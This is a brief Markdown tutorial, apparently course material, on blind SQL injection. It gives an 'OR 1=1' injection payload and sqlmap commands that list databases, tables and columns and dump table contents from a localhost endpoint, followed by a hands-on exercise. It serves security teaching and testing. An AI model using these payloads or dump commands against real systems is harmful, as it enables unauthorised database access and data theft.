# SQL Injection

Blind SQL injections (blind SQLi) occur when a web application is exposed to SQL injection, but its 
HTTP responses don’t contain the results of the SQL query or any details of database errors.

In a Blind SQL Injection, attackers never see the output of the SQL queries. Still, they may see if 
the application or web page loads normally, and discern how long the SQL server needs to process the 
SQL query that an attacker passed in the user input.[¹](#references)

In the next links, you may find interesting information about vulnerability testing and some tricks 
that will help you to defend your applications against attacks:
- [Boolean-based blind test](https://beaglesecurity.com/blog/vulnerability/boolean-based-blind-sql-injection.html)
- [SQLi Cheat-Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet)

Simple demonstration of the error: `?product=")%20OR%201=1%20%23`

### SQLMap
[Kali tools - SQLMap](https://www.kali.org/tools/sqlmap/)

#### Install it

```bash
$ sudo apt install sqlmap
```

#### Use it

```bash
# List databases
$ sqlmap -u "http://localhost:8080/products?sortBy=1" --dbs

# List tables
$ sqlmap -u "http://localhost:8080/products?sortBy=1" -D <db_name> --tables

# List columns
$ sqlmap -u "http://localhost:8080/products?sortBy=1" --col
# or for one table:
$ sqlmap -u "http://localhost:8080/products?sortBy=1" -D <db_name> -T <table_name> --col

# Dump table data 
$ sqlmap -u "http://localhost:8080/products?sortBy=1" -D <db_name> -T <table_name> --dump
```

## 🖱️ Hands on

Test the sqlmap script with POST endpoints with

```bash
$ sqlmap -u "URL" --data="POST_DATA" -p paramether_to_test <...>
```

And try to obtain a dump from the tables.

## References
 1. [What is blind sqli?](https://brightsec.com/blog/blind-sql-injection/)